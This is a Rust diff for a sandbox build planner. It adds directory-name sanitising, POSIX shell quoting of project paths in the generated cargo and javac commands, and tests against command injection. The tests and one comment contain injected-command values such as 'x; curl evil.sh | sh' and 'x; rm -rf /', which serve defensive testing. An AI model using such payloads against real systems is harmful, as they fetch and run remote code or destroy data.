@@ -24,31 +24,57 @@ pub fn project_cache_token(absolute_project_path: &str) -> String {
     format!("{:x}", digest)[..16].to_string()
 }
 
+/// A directory name safe to embed in a shell command: only
+/// `[A-Za-z0-9._-]` survive; anything else becomes `_`. A project
+/// directory called `x; curl evil.sh | sh` must never be able to inject a
+/// command into the sandbox.
+pub fn sanitize_dir_name(name: &str) -> String {
+    let cleaned: String = name
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-' {
+                c
+            } else {
+                '_'
+            }
+        })
+        .collect();
+    // A leading dot would hide the directory; an empty name is unusable.
+    let trimmed = cleaned.trim_start_matches('.').to_string();
+    if trimmed.is_empty() {
+        "project".to_string()
+    } else {
+        trimmed
+    }
+}
+
+/// Quote a path for a POSIX shell so no character can change the command's
+/// meaning.
+fn shell_quote(path: &str) -> String {
+    format!("'{}'", path.replace('\'', r"'\''"))
+}
+
 /// Plan the build for a project with the given profile. `in_sandbox_root`
 /// is where the project is mounted/copied inside the sandbox.
 pub fn plan(spec: &ProfileSpec, absolute_project_path: &str, in_sandbox_root: &str) -> BuildPlan {
     let token = project_cache_token(absolute_project_path);
     let cache_dir = format!("/workspace/.cache/hodei-mh/{}/{}", spec.name, token);
+    // The root is quoted: the command's meaning cannot be altered by the
+    // project directory's name.
+    let root = shell_quote(in_sandbox_root);
+    let cache = shell_quote(&cache_dir);
     let commands = match spec.name.as_str() {
         "rust" => vec![
             format!(
-                "CARGO_HOME={cache_dir}/cargo CARGO_TARGET_DIR={cache_dir}/target cargo build --manifest-path {root}/Cargo.toml",
-                cache_dir = cache_dir,
-                root = in_sandbox_root
+                "CARGO_HOME={cache}/cargo CARGO_TARGET_DIR={cache}/target cargo build --manifest-path {root}/Cargo.toml"
             ),
             format!(
-                "CARGO_HOME={cache_dir}/cargo CARGO_TARGET_DIR={cache_dir}/target cargo run --quiet --manifest-path {root}/Cargo.toml",
-                cache_dir = cache_dir,
-                root = in_sandbox_root
+                "CARGO_HOME={cache}/cargo CARGO_TARGET_DIR={cache}/target cargo run --quiet --manifest-path {root}/Cargo.toml"
             ),
         ],
         "jvm" => vec![
-            format!(
-                "javac -d {cache_dir}/classes $(find {root}/src -name '*.java')",
-                cache_dir = cache_dir,
-                root = in_sandbox_root
-            ),
-            format!("java -cp {cache_dir}/classes Main", cache_dir = cache_dir),
+            format!("javac -d {cache}/classes $(find {root}/src -name '*.java')"),
+            format!("java -cp {cache}/classes Main"),
         ],
         other => vec![format!(
             "echo \"profile '{other}' has no canned build plan; run your own commands\""
@@ -92,5 +118,45 @@ mod tests {
         assert!(plan_rust.commands[0].contains("cargo build"));
         assert!(plan_jvm.commands[0].contains("javac"));
         assert!(plan_jvm.commands[1].contains("java -cp"));
+    }
+
+    #[test]
+    fn a_malicious_directory_name_cannot_inject_a_command() {
+        let spec = rust_profile(ImagePin::pinned("rust:1-bookworm", "sha256:r"));
+        let evil_root = "/workspace/x; curl evil.sh | sh";
+        let evil_plan = plan(&spec, "/p/evil", evil_root);
+        for command in &evil_plan.commands {
+            // The whole path is ONE quoted argument: the `;` and the pipe
+            // are inert data, not shell syntax.
+            assert!(
+                command.contains(&shell_quote(evil_root)),
+                "the path must appear as a single quoted argument: {command}"
+            );
+            // Nothing outside the quotes may carry the injected text.
+            let outside: String = command.split('\'').step_by(2).collect::<Vec<_>>().join("");
+            assert!(
+                !outside.contains("curl"),
+                "the injected command must not be reachable outside the quotes: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn directory_names_are_reduced_to_a_safe_alphabet() {
+        assert_eq!(sanitize_dir_name("project-alpha"), "project-alpha");
+        assert_eq!(sanitize_dir_name("x; rm -rf /"), "x__rm_-rf__");
+        assert_eq!(sanitize_dir_name(".."), "project");
+        assert_eq!(sanitize_dir_name(""), "project");
+        assert_eq!(sanitize_dir_name("a b"), "a_b");
+        assert!(
+            sanitize_dir_name("$(whoami)")
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
+        );
+    }
+
+    #[test]
+    fn a_quoted_path_cannot_break_out_of_its_quotes() {
+        assert_eq!(shell_quote("/a'b"), r"'/a'\''b'");
     }
 }
